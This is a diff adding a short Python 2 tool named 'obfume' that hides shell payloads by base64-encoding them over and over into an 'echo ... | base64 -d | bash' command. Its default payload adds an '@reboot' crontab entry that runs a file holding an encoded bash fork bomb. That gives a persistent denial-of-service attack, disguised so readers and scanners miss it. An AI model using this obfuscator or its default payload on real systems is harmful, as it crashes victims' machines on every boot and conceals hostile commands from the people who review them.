@@ -1,0 +1,42 @@
+#! /usr/bin/env python
+
+## Filename: obfume
+## Author: Jack64, stryngs
+## Concept: Obfuscate a payload
+
+import base64
+
+def b64_iter(payload):
+	command = "echo "
+	command += base64.b64encode(payload)
+	command += " | base64 -d | bash"
+	return command
+
+
+def default_payload():
+	return '''crontab -l > .k; echo "@reboot /bin/bash $(pwd)/fu" >> .k; crontab < .k; rm .k; echo "echo OigpeyA6fDomIH07Ogo= | base64 -d | bash" > $(pwd)/fu;chmod 0755 fu;'''
+
+def main():
+	payload = raw_input('Desired Payload? [Default]\n')
+	if not payload:
+		payload = default_payload()
+	itr = int(raw_input('Desired Iterations?\n'))
+	output = obfs_bash_b64_iter(payload, itr)
+	with open('obs.txt', 'wb') as oFile:
+		oFile.write(output + '\n')
+	print 'Output file is obs.txt!'
+
+def obfs_bash_b64_iter(payload,n):
+	i = 0
+	cnt = 1
+	command = payload
+	while (i < n):
+		c2 = b64_iter(command)
+		command = c2
+		i += 1
+		print 'Iteration: ', cnt
+		cnt += 1
+	return command
+
+if __name__ == '__main__':
+	main()
